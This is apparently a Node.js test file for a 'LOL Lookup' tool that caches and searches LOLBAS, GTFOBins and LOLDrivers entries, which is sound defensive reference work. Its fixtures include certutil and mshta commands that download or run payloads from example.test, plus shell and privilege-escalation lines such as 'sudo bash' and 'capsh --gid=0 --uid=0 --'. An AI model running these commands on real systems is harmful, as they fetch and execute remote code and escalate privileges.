const test = require("node:test");
const assert = require("node:assert/strict");
const Database = require("better-sqlite3");
const cacheMigration = require("../server/core/db/migrations/034_lol_lookup_cache");
const searchProjectionMigration = require("../server/core/db/migrations/035_lol_lookup_search_projection");
const {
  normalizeSourceDocument,
  replaceLolLookupSource,
  searchLolLookup,
  getLolLookupEntry,
  getLolLookupStatus,
} = require("../server/core/minitools/lol-lookup");

function createDb() {
  const db = new Database(":memory:");
  db.pragma("foreign_keys = ON");
  cacheMigration.up(db);
  searchProjectionMigration.up(db);
  return db;
}

function seedSource(db, sourceKey, rawDocument, fetchedAt = Math.floor(Date.now() / 1000)) {
  const sourceVersion = "test-version";
  const entries = normalizeSourceDocument(sourceKey, rawDocument, { fetchedAt, sourceVersion });
  replaceLolLookupSource(db, {
    sourceKey,
    rawDocument,
    entries,
    fetchedAt,
    sourceVersion,
    contentHash: `${sourceKey}-hash`,
    backupPath: `C:\\tmp\\${sourceKey}.json`,
  });
  return entries;
}

test("LOL Lookup normalises source commands and searches the local cache", () => {
  const db = createDb();
  try {
    const lolbas = seedSource(db, "lolbas", JSON.stringify([{
      Name: "Certutil.exe",
      Description: "Certificate utility that can download files.",
      Author: "LOLBAS",
      Commands: [{
        Command: "certutil.exe -urlcache -split -f https://example.test/payload.exe payload.exe",
        Description: "Download a remote file.",
        Category: "Download",
        MitreID: "T1105",
        Tags: [{ Download: "HTTP" }],
      }],
      Full_Path: [{ Path: "C:\\Windows\\System32\\certutil.exe" }],
      Detection: [{ Sigma: "https://example.test/sigma" }],
      Resources: [{ Link: "https://example.test/certutil" }],
      url: "https://lolbas-project.github.io/lolbas/Binaries/Certutil/",
    }]));
    const gtfobins = seedSource(db, "gtfobins", JSON.stringify({
      functions: {
        shell: { label: "Shell", mitre: ["T1059"] },
        sudo: { label: "Sudo" },
      },
      executables: {
        bash: {
          description: "Bash can spawn a shell.",
          functions: {
            shell: [{ code: "bash -p", contexts: { unprivileged: null } }],
            sudo: [{ comment: "Preserve privileges.", code: "sudo bash", contexts: { sudo: null } }],
          },
        },
        sh: { alias: "bash" },
      },
    }));
    seedSource(db, "loldrivers", JSON.stringify({
      Id: "driver-1",
      Description: "Vulnerable driver exposes kernel primitives.",
      Category: "Vulnerable driver",
      KnownVulnerableSamples: [{
        Filename: "evil.sys",
        SHA256: "a".repeat(64),
        SHA1: "b".repeat(40),
        MD5: "c".repeat(32),
        Signer: "Example Signer",
        Vendor: "Example Vendor",
      }],
      Tags: ["BYOVD"],
    }));

    const certutil = searchLolLookup(db, { query: "certutil", mode: "quick" });
    assert.equal(certutil.results[0].name, "Certutil.exe");
    assert.equal(certutil.results[0].source, "lolbas");
    assert.ok(certutil.results[0].functions.includes("Download"));

    const commandLookup = searchLolLookup(db, { query: "sudo bash", mode: "command" });
    assert.equal(commandLookup.results[0].source, "gtfobins");
    assert.equal(commandLookup.results[0].name, "bash");
    assert.equal(searchLolLookup(db, { query: "sh", mode: "exact" }).results[0].functions[0], "shell");

    const driverHash = searchLolLookup(db, { query: "a".repeat(64), mode: "hash" });
    assert.equal(driverHash.results.length, 1);
    assert.equal(driverHash.results[0].name, "evil.sys");
    assert.equal(driverHash.results[0].vendor, "Example Vendor");

    const lolbasDetail = getLolLookupEntry(db, lolbas[0].id);
    assert.match(lolbasDetail.commands[0].command, /certutil\.exe/);
    assert.deepEqual(lolbasDetail.attackMappings, ["T1105"]);
    assert.equal(getLolLookupEntry(db, gtfobins[0].id).commands[1].function, "sudo");
  } finally {
    db.close();
  }
});

test("LOL Lookup status exposes per-source freshness and backup counts", () => {
  const db = createDb();
  try {
    seedSource(db, "gtfobins", JSON.stringify({
      functions: { shell: { label: "Shell", mitre: ["T1059"] } },
      executables: {
        capsh: { description: null, functions: { shell: [{ code: "capsh --gid=0 --uid=0 --" }] } },
      },
    }));
    const status = getLolLookupStatus(db, { getSetting: () => null });
    const gtfobins = status.sources.find((source) => source.key === "gtfobins");
    const lolbas = status.sources.find((source) => source.key === "lolbas");
    assert.equal(gtfobins.entryCount, 1);
    assert.equal(gtfobins.backupCount, 1);
    assert.equal(gtfobins.stale, false);
    assert.equal(lolbas.entryCount, 0);
    assert.equal(lolbas.stale, true);
    assert.deepEqual(status.functionFacets.bySource.gtfobins, ["shell"]);
    assert.deepEqual(status.functionFacets.bySource.lolbas, []);
    assert.deepEqual(status.functionFacets.all, ["shell"]);
  } finally {
    db.close();
  }
});

test("LOL Lookup status surfaces interrupted source refresh attempts", () => {
  const db = createDb();
  try {
    seedSource(db, "loldrivers", JSON.stringify({
      Id: "driver-interrupted",
      Description: "Driver cache entry used for status checks.",
      KnownVulnerableSamples: [{ Filename: "status.sys", SHA256: "f".repeat(64) }],
    }), 1000);
    db.prepare(`
      UPDATE lol_lookup_sources
      SET last_attempted_at = last_success_at + 5, last_error = NULL
      WHERE source_key = 'loldrivers'
    `).run();

    const status = getLolLookupStatus(db, { getSetting: () => null });
    const loldrivers = status.sources.find((source) => source.key === "loldrivers");
    assert.match(loldrivers.lastError, /did not complete/i);
  } finally {
    db.close();
  }
});

test("LOL Lookup supports function-filtered browsing without search text", () => {
  const db = createDb();
  try {
    seedSource(db, "lolbas", JSON.stringify([{
      Name: "Msbuild.exe",
      Commands: [{ Command: "msbuild.exe payload.xml", Category: "Execute" }],
      url: "https://lolbas-project.github.io/lolbas/Binaries/Msbuild/",
    }, {
      Name: "Mshta.exe",
      Commands: [{ Command: "mshta.exe https://example.test/payload.hta", Category: "Execute" }],
      url: "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
    }, {
      Name: "Certutil.exe",
      Commands: [{ Command: "certutil.exe -urlcache -split -f https://example.test/a.exe a.exe", Category: "Download" }],
      url: "https://lolbas-project.github.io/lolbas/Binaries/Certutil/",
    }]));

    const executeLolbas = searchLolLookup(db, {
      query: "",
      mode: "quick",
      source: "lolbas",
      functionFilter: "Execute",
      limit: 1,
    });
    assert.deepEqual(executeLolbas.results.map((entry) => entry.name), ["Msbuild.exe", "Mshta.exe"]);
    assert.equal(searchLolLookup(db, { query: "", mode: "quick" }).results.length, 0);
  } finally {
    db.close();
  }
});

test("LOL Lookup refresh replacement keeps one indexed row set per source", () => {
  const db = createDb();
  try {
    seedSource(db, "lolbas", JSON.stringify([{
      Name: "Certutil.exe",
      Commands: [{ Command: "certutil.exe -urlcache -split -f https://example.test/a.exe a.exe", Category: "Download" }],
      url: "https://lolbas-project.github.io/lolbas/Binaries/Certutil/",
    }]), 1000);
    seedSource(db, "lolbas", JSON.stringify([{
      Name: "Msbuild.exe",
      Commands: [{ Command: "msbuild.exe payload.xml", Category: "Execute" }],
      url: "https://lolbas-project.github.io/lolbas/Binaries/Msbuild/",
    }]), 2000);

    assert.equal(db.prepare("SELECT COUNT(*) AS count FROM lol_lookup_entries WHERE source_key = 'lolbas'").get().count, 1);
    assert.equal(searchLolLookup(db, { query: "certutil", mode: "quick" }).results.length, 0);
    assert.equal(searchLolLookup(db, { query: "msbuild", mode: "quick" }).results[0].name, "Msbuild.exe");
    assert.equal(db.prepare("SELECT COUNT(*) AS count FROM lol_lookup_backups WHERE source_key = 'lolbas'").get().count, 2);
  } finally {
    db.close();
  }
});

test("LOL Lookup search ignores raw-only upstream fields", () => {
  const db = createDb();
  try {
    seedSource(db, "loldrivers", JSON.stringify({
      Id: "driver-raw-field",
      Description: "Searchable vulnerable driver metadata.",
      RawOnlyMarker: "do-not-index-this-upstream-blob",
      KnownVulnerableSamples: [{
        Filename: "indexed.sys",
        SHA256: "d".repeat(64),
      }],
    }));

    assert.equal(searchLolLookup(db, { query: "indexed.sys", mode: "quick" }).results.length, 1);
    assert.equal(searchLolLookup(db, { query: "do-not-index-this-upstream-blob", mode: "quick" }).results.length, 0);
  } finally {
    db.close();
  }
});
